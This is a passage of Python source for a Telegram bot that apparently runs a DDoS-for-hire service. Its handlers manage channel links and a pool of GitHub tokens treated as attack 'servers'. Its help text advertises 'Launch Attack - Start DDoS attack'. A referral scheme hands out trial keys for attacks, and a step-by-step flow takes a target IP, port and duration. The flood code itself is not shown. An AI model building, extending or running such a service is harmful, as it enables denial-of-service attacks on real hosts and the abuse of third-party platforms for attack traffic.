        f"👥 {bold('𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩')}:\n"
        f"  {bold('𝐋𝐢𝐧𝐤')}: {links_config['free_group']['link']}\n"
        f"  {bold('𝐈𝐃')}: {links_config['free_group']['id']}\n\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧')}:"
    )

    reply_markup = get_link_settings_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def set_private_link_start(update: Update, user_id):
    """Start set private channel link"""
    if not is_owner(user_id):
        return

    temp_data[user_id] = {"step": "set_private_link"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"🔒 {bold('𝐒𝐄𝐓 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐋𝐈𝐍𝐊')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭')}: {links_config['channels'][0]['invite_link']}\n\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐧𝐞𝐰 𝐢𝐧𝐯𝐢𝐭𝐞 𝐥𝐢𝐧𝐤')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `https://t.me/+abc123xyz`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def set_public_link_start(update: Update, user_id):
    """Start set public channel link"""
    if not is_owner(user_id):
        return

    temp_data[user_id] = {"step": "set_public_link"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"🌍 {bold('𝐒𝐄𝐓 𝐏𝐔𝐁𝐋𝐈𝐂 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐋𝐈𝐍𝐊')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭')}: {links_config['channels'][1]['link']}\n\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐧𝐞𝐰 𝐥𝐢𝐧𝐤')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `https://t.me/flame1769_updates`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def set_free_group_link_start(update: Update, user_id):
    """Start set free group link"""
    if not is_owner(user_id):
        return

    temp_data[user_id] = {"step": "set_free_group_link"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"👥 {bold('𝐒𝐄𝐓 𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐍𝐊')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭')}: {links_config['free_group']['link']}\n\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐧𝐞𝐰 𝐥𝐢𝐧𝐤')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `https://t.me/your_free_group`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def set_free_group_id_link_start(update: Update, user_id):
    """Start set free group ID from link settings"""
    if not is_owner(user_id):
        return

    temp_data[user_id] = {"step": "set_free_group_id_link"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"🆔 {bold('𝐒𝐄𝐓 𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏 𝐈𝐃')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭')}: {links_config['free_group']['id']}\n\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐧𝐞𝐰 𝐠𝐫𝐨𝐮𝐩 𝐈𝐃')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `-100123456789`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def test_all_links(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    """Test all links"""
    if not is_owner(user_id):
        return

    await update.message.reply_text(f"🔄 {bold('𝐓𝐄𝐒𝐓𝐈𝐍𝐆 𝐀𝐋𝐋 𝐋𝐈𝐍𝐊𝐒')}...\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
    
    results = []
    
    # Test private channel
    try:
        chat = await context.bot.get_chat(links_config['channels'][0]['username'])
        results.append(f"✅ {bold('𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥')}: 𝐀𝐜𝐜𝐞𝐬𝐬𝐢𝐛𝐥𝐞")
    except:
        results.append(f"❌ {bold('𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥')}: 𝐍𝐨𝐭 𝐀𝐜𝐜𝐞𝐬𝐬𝐢𝐛𝐥𝐞")
    
    # Test public channel
    try:
        chat = await context.bot.get_chat(links_config['channels'][1]['username'])
        results.append(f"✅ {bold('𝐏𝐮𝐛𝐥𝐢𝐜 𝐂𝐡𝐚𝐧𝐧𝐞𝐥')}: 𝐀𝐜𝐜𝐞𝐬𝐬𝐢𝐛𝐥𝐞")
    except:
        results.append(f"❌ {bold('𝐏𝐮𝐛𝐥𝐢𝐜 𝐂𝐡𝐚𝐧𝐧𝐞𝐥')}: 𝐍𝐨𝐭 𝐀𝐜𝐜𝐞𝐬𝐬𝐢𝐛𝐥𝐞")
    
    # Test free group
    try:
        if links_config['free_group']['id'] != -100123456789:
            chat = await context.bot.get_chat(links_config['free_group']['id'])
            results.append(f"✅ {bold('𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩')}: 𝐀𝐜𝐜𝐞𝐬𝐬𝐢𝐛𝐥𝐞")
        else:
            results.append(f"⚠️ {bold('𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩')}: 𝐈𝐃 𝐧𝐨𝐭 𝐬𝐞𝐭")
    except:
        results.append(f"❌ {bold('𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩')}: 𝐍𝐨𝐭 𝐀𝐜𝐜𝐞𝐬𝐬𝐢𝐛𝐥𝐞")
    
    message = f"📊 {bold('𝐋𝐈𝐍𝐊 𝐓𝐄𝐒𝐓 𝐑𝐄𝐒𝐔𝐋𝐓𝐒')}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    message += "\n".join(results)
    message += f"\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    
    await update.message.reply_text(message)

async def view_links(update: Update, user_id):
    """View all links"""
    if not is_owner(user_id):
        return

    message = (
        f"🔗 {bold('𝐂𝐔𝐑𝐑𝐄𝐍𝐓 𝐋𝐈𝐍𝐊𝐒')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📢 {bold('𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥')}:\n"
        f"  {bold('𝐋𝐢𝐧𝐤')}: {links_config['channels'][0]['invite_link']}\n\n"
        f"📢 {bold('𝐏𝐮𝐛𝐥𝐢𝐜 𝐂𝐡𝐚𝐧𝐧𝐞𝐥')}:\n"
        f"  {bold('𝐋𝐢𝐧𝐤')}: {links_config['channels'][1]['link']}\n\n"
        f"👥 {bold('𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩')}:\n"
        f"  {bold('𝐋𝐢𝐧𝐤')}: {links_config['free_group']['link']}\n"
        f"  {bold('𝐈𝐃')}: {links_config['free_group']['id']}\n\n"
        f"🔗 {bold('𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥 𝐁𝐚𝐬𝐞')}: {links_config['referral']['base_link']}\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )
    
    await update.message.reply_text(message)

# ==================== TOKEN MANAGEMENT ====================
async def show_token_management(update: Update, user_id):
    """Show token management menu"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    message = (
        f"🔑 {bold('𝐓𝐎𝐊𝐄𝐍 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐓𝐨𝐭𝐚𝐥 𝐒𝐞𝐫𝐯𝐞𝐫𝐬')}: {len(github_tokens)}\n\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧 𝐛𝐞𝐥𝐨𝐰')}:\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

    reply_markup = get_token_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def add_token_start(update: Update, user_id):
    """Start add token process"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "token_add"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"➕ {bold('𝐀𝐃𝐃 𝐓𝐎𝐊𝐄𝐍')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐆𝐢𝐭𝐇𝐮𝐛 𝐭𝐨𝐤𝐞𝐧')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `ghp_xxxxxxxxxxxxx`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def list_tokens(update: Update, user_id):
    """List all tokens"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if not github_tokens:
        await update.message.reply_text(f"📭 {bold('𝐍𝐎 𝐓𝐎𝐊𝐄𝐍𝐒 𝐀𝐃𝐃𝐄𝐃 𝐘𝐄𝐓')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    tokens_list = f"🔑 {bold('𝐒𝐄𝐑𝐕𝐄𝐑𝐒 𝐋𝐈𝐒𝐓')}:\n━━━━━━━━━━━━━━━━━━━━━━\n"
    
    active_count = 0
    suspended_count = 0
    
    for i, token_data in enumerate(github_tokens[:15], 1):
        status = check_token_status(token_data)
        if status == "active":
            status_emoji = "✅"
            active_count += 1
        elif status == "suspended":
            status_emoji = "⚠️"
            suspended_count += 1
        else:
            status_emoji = "❌"
        
        tokens_list += f"{i}. {status_emoji} `{token_data['username']}`\n   📁 `{token_data['repo']}`\n\n"

    tokens_list += f"📊 {bold('𝐓𝐨𝐭𝐚𝐥 𝐒𝐞𝐫𝐯𝐞𝐫𝐬')}: {len(github_tokens)}\n"
    tokens_list += f"✅ {bold('𝐀𝐜𝐭𝐢𝐯𝐞')}: {active_count}\n"
    tokens_list += f"⚠️ {bold('𝐒𝐮𝐬𝐩𝐞𝐧𝐝𝐞𝐝')}: {suspended_count}\n\n"
    tokens_list += f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    
    await update.message.reply_text(tokens_list)

async def remove_token_start(update: Update, user_id):
    """Start remove token process"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if not github_tokens:
        await update.message.reply_text(f"📭 {bold('𝐍𝐎 𝐓𝐎𝐊𝐄𝐍𝐒 𝐓𝐎 𝐑𝐄𝐌𝐎𝐕𝐄')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "token_remove"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"🗑️ {bold('𝐑𝐄𝐌𝐎𝐕𝐄 𝐓𝐎𝐊𝐄𝐍')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐭𝐨𝐤𝐞𝐧 𝐧𝐮𝐦𝐛𝐞𝐫')} (1-{len(github_tokens)}):\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `1`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def remove_expired_tokens(update: Update, user_id):
    """Remove expired tokens"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    await update.message.reply_text(f"🔄 {bold('𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐓𝐎𝐊𝐄𝐍𝐒')}...\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    valid_tokens = []
    expired_tokens = []

    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            user = g.get_user()
            _ = user.login
            valid_tokens.append(token_data)
        except:
            expired_tokens.append(token_data)

    if not expired_tokens:
        await update.message.reply_text(f"✅ {bold('𝐀𝐋𝐋 𝐓𝐎𝐊𝐄𝐍𝐒 𝐀𝐑𝐄 𝐕𝐀𝐋𝐈𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    github_tokens.clear()
    github_tokens.extend(valid_tokens)
    save_github_tokens(github_tokens)

    expired_list = f"🗑️ {bold('𝐄𝐗𝐏𝐈𝐑𝐄𝐃 𝐓𝐎𝐊𝐄𝐍𝐒 𝐑𝐄𝐌𝐎𝐕𝐄𝐃')}:\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for token in expired_tokens[:10]:
        expired_list += f"• `{token['username']}` - {token['repo']}\n"

    expired_list += f"\n📊 {bold('𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐓𝐨𝐤𝐞𝐧𝐬')}: {len(valid_tokens)}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    await update.message.reply_text(expired_list)

# ==================== HELP ====================
async def help_handler(update: Update, user_id):
    """Show help message"""
    if is_owner(user_id) or is_admin(user_id):
        message = (
            f"🆘 {bold('𝐇𝐄𝐋𝐏')} - {bold('𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐅𝐨𝐫 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬')}:\n"
            f"• {bold('𝐋𝐚𝐮𝐧𝐜𝐡 𝐀𝐭𝐭𝐚𝐜𝐤')} - 𝐒𝐭𝐚𝐫𝐭 𝐃𝐃𝐨𝐒 𝐚𝐭𝐭𝐚𝐜𝐤\n"
            f"• {bold('𝐂𝐡𝐞𝐜𝐤 𝐒𝐭𝐚𝐭𝐮𝐬')} - 𝐕𝐢𝐞𝐰 𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐭𝐮𝐬\n"
            f"• {bold('𝐒𝐭𝐨𝐩 𝐀𝐭𝐭𝐚𝐜𝐤')} - 𝐒𝐭𝐨𝐩 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐚𝐭𝐭𝐚𝐜𝐤\n"
            f"• {bold('𝐌𝐲 𝐀𝐜𝐜𝐞𝐬𝐬')} - 𝐂𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐢𝐧𝐟𝐨\n"
            f"• {bold('𝐑𝐞𝐝𝐞𝐞𝐦 𝐊𝐞𝐲')} - 𝐑𝐞𝐝𝐞𝐞𝐦 𝐭𝐫𝐢𝐚𝐥 𝐤𝐞𝐲\n\n"
            f"{bold('𝐀𝐝𝐦𝐢𝐧 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬')}:\n"
            f"• {bold('𝐔𝐬𝐞𝐫 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭')} - 𝐀𝐝𝐝/𝐫𝐞𝐦𝐨𝐯𝐞 𝐮𝐬𝐞𝐫𝐬\n"
            f"• {bold('𝐁𝐨𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬')} - 𝐂𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐞 𝐛𝐨𝐭\n\n"
            f"{bold('𝐎𝐰𝐧𝐞𝐫 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬')}:\n"
            f"• {bold('𝐎𝐰𝐧𝐞𝐫 𝐏𝐚𝐧𝐞𝐥')} - 𝐌𝐚𝐧𝐚𝐠𝐞 𝐨𝐰𝐧𝐞𝐫𝐬/𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬\n"
            f"• {bold('𝐏𝐫𝐢𝐜𝐞 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭')} - 𝐂𝐡𝐚𝐧𝐠𝐞 𝐩𝐫𝐢𝐜𝐞𝐬\n"
            f"• {bold('𝐅𝐫𝐞𝐞 𝐂𝐨𝐧𝐭𝐫𝐨𝐥𝐬')} - 𝐂𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐞 𝐟𝐫𝐞𝐞 𝐮𝐬𝐞𝐫𝐬\n"
            f"• {bold('𝐋𝐢𝐧𝐤 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬')} - 𝐌𝐚𝐧𝐚𝐠𝐞 𝐜𝐡𝐚𝐧𝐧𝐞𝐥/𝐠𝐫𝐨𝐮𝐩 𝐥𝐢𝐧𝐤𝐬\n"
            f"• {bold('𝐓𝐨𝐤𝐞𝐧 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭')} - 𝐌𝐚𝐧𝐚𝐠𝐞 𝐆𝐢𝐭𝐇𝐮𝐛 𝐭𝐨𝐤𝐞𝐧𝐬\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐍𝐞𝐞𝐝 𝐡𝐞𝐥𝐩')}? {bold('𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐚𝐝𝐦𝐢𝐧')}.\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )
    elif can_user_attack(user_id):
        message = (
            f"🆘 {bold('𝐇𝐄𝐋𝐏')} - {bold('𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• {bold('𝐋𝐚𝐮𝐧𝐜𝐡 𝐀𝐭𝐭𝐚𝐜𝐤')} - 𝐒𝐭𝐚𝐫𝐭 𝐃𝐃𝐨𝐒 𝐚𝐭𝐭𝐚𝐜𝐤\n"
            f"• {bold('𝐂𝐡𝐞𝐜𝐤 𝐒𝐭𝐚𝐭𝐮𝐬')} - 𝐕𝐢𝐞𝐰 𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐭𝐮𝐬\n"
            f"• {bold('𝐒𝐭𝐨𝐩 𝐀𝐭𝐭𝐚𝐜𝐤')} - 𝐒𝐭𝐨𝐩 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐚𝐭𝐭𝐚𝐜𝐤\n"
            f"• {bold('𝐌𝐲 𝐀𝐜𝐜𝐞𝐬𝐬')} - 𝐂𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐢𝐧𝐟𝐨\n"
            f"• {bold('𝐑𝐞𝐝𝐞𝐞𝐦 𝐊𝐞𝐲')} - 𝐑𝐞𝐝𝐞𝐞𝐦 𝐭𝐫𝐢𝐚𝐥 𝐤𝐞𝐲\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐍𝐞𝐞𝐝 𝐡𝐞𝐥𝐩')}? {bold('𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐚𝐝𝐦𝐢𝐧')}.\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )
    elif is_free_user(user_id):
        message = (
            f"🆘 {bold('𝐇𝐄𝐋𝐏')} - {bold('𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐇𝐨𝐰 𝐭𝐨 𝐠𝐞𝐭 𝐚𝐜𝐜𝐞𝐬𝐬')}:\n"
            f"1️⃣ {bold('𝐑𝐞𝐟𝐞𝐫 𝟐 𝐟𝐫𝐢𝐞𝐧𝐝𝐬')} 𝐮𝐬𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐥𝐢𝐧𝐤\n"
            f"2️⃣ {bold('𝐓𝐡𝐞𝐲 𝐦𝐮𝐬𝐭 𝐣𝐨𝐢𝐧 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬')}\n"
            f"3️⃣ {bold('𝐆𝐞𝐭 𝟐-𝐡𝐨𝐮𝐫 𝐤𝐞𝐲')}\n"
            f"4️⃣ {bold('𝐉𝐨𝐢𝐧 𝐟𝐫𝐞𝐞 𝐠𝐫𝐨𝐮𝐩 𝐭𝐨 𝐚𝐭𝐭𝐚𝐜𝐤')}\n\n"
            f"⚠️ {bold('𝐅𝐫𝐞𝐞 𝐮𝐬𝐞𝐫𝐬 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐧 𝐭𝐡𝐞 𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏')}\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )
    else:
        message = (
            f"🆘 {bold('𝐇𝐄𝐋𝐏')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐓𝐨 𝐆𝐞𝐭 𝐀𝐜𝐜𝐞𝐬𝐬')}:\n"
            f"1️⃣ {bold('𝐔𝐬𝐞')} /start {bold('𝐭𝐨 𝐫𝐞𝐪𝐮𝐞𝐬𝐭')}\n"
            f"2️⃣ {bold('𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐚𝐝𝐦𝐢𝐧')}\n"
            f"3️⃣ {bold('𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥')}\n"
            f"4️⃣ {bold('𝐎𝐫 𝐮𝐬𝐞 𝐑𝐞𝐝𝐞𝐞𝐦 𝐊𝐞𝐲')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐘𝐨𝐮𝐫 𝐈𝐃')}: `{user_id}`\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )

    await update.message.reply_text(message)

# ==================== TEXT INPUT HANDLER ====================
async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id, text):
    """Handle text input for multi-step operations"""
    if user_id not in temp_data:
        return

    step = temp_data[user_id].get("step")

    if step == WAITING_FOR_REDEEM_KEY:
        key = text.strip().upper()
        success, message = redeem_trial_key(key, user_id, update)
        if success:
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(message, reply_markup=reply_markup)
        else:
            await update.message.reply_text(message, reply_markup=get_cancel_keyboard())
        del temp_data[user_id]

    elif step == WAITING_FOR_FEEDBACK:
        await handle_feedback(update, context, user_id)
        del temp_data[user_id]

    elif step == "attack_ip":
        ip = text.strip()
        if not is_valid_ip(ip):
            await update.message.reply_text(f"⚠️ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐏')}\n{bold('𝐈𝐏𝐬 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡')} '15' {bold('𝐨𝐫')} '96' {bold('𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝')}.\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐈𝐏')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
            return

        method, method_name = get_attack_method(ip)
        if method is None:
            await update.message.reply_text(f"⚠️ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐏')}\n{method_name}\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐈𝐏')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
            return

        temp_data[user_id] = {"step": "attack_port", "ip": ip, "method": method, "server": temp_data[user_id].get("server", "𝐔𝐍𝐊𝐍𝐎𝐖𝐍")}
        await update.message.reply_text(
            f"🎯 {bold('𝐋𝐀𝐔𝐍𝐂𝐇 𝐀𝐓𝐓𝐀𝐂𝐊')} - {bold('𝐒𝐓𝐄𝐏 𝟐/𝟑')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✓ {bold('𝐈𝐏')}: `{ip}`\n\n"
            f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐭𝐚𝐫𝐠𝐞𝐭 𝐏𝐎𝐑𝐓')}:\n\n{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `80` {bold('𝐨𝐫')} `443`\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )

    elif step == "attack_port":
        try:
            port = int(text.strip())
            if port <= 0 or port > 65535:
                await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐏𝐎𝐑𝐓')}\n{bold('𝐏𝐨𝐫𝐭 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐛𝐞𝐭𝐰𝐞𝐞𝐧 𝟏 𝐚𝐧𝐝 𝟔𝟓𝟓𝟑𝟓')}.\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
                return

            temp_data[user_id]["port"] = port
            temp_data[user_id]["step"] = "attack_time"

            keyboard = [
                [InlineKeyboardButton(bold("𝟑𝟎𝐬"), callback_data="attack_time_30"),
                 InlineKeyboardButton(bold("𝟔𝟎𝐬"), callback_data="attack_time_60"),
                 InlineKeyboardButton(bold("𝟗𝟎𝐬"), callback_data="attack_time_90")],
                [InlineKeyboardButton(bold("𝟏𝟐𝟎𝐬"), callback_data="attack_time_120"),
                 InlineKeyboardButton(bold("𝟏𝟖𝟎𝐬"), callback_data="attack_time_180"),
                 InlineKeyboardButton(bold("𝟑𝟎𝟎𝐬"), callback_data="attack_time_300")],
                [InlineKeyboardButton(bold("❌ 𝐂𝐚𝐧𝐜𝐞𝐥"), callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                f"🎯 {bold('𝐋𝐀𝐔𝐍𝐂𝐇 𝐀𝐓𝐓𝐀𝐂𝐊')} - {bold('𝐒𝐓𝐄𝐏 𝟑/𝟑')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✓ {bold('𝐈𝐏')}: `{temp_data[user_id]['ip']}`\n"
                f"✓ {bold('𝐏𝐨𝐫𝐭')}: `{port}`\n\n"
                f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}:\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )

        except ValueError:
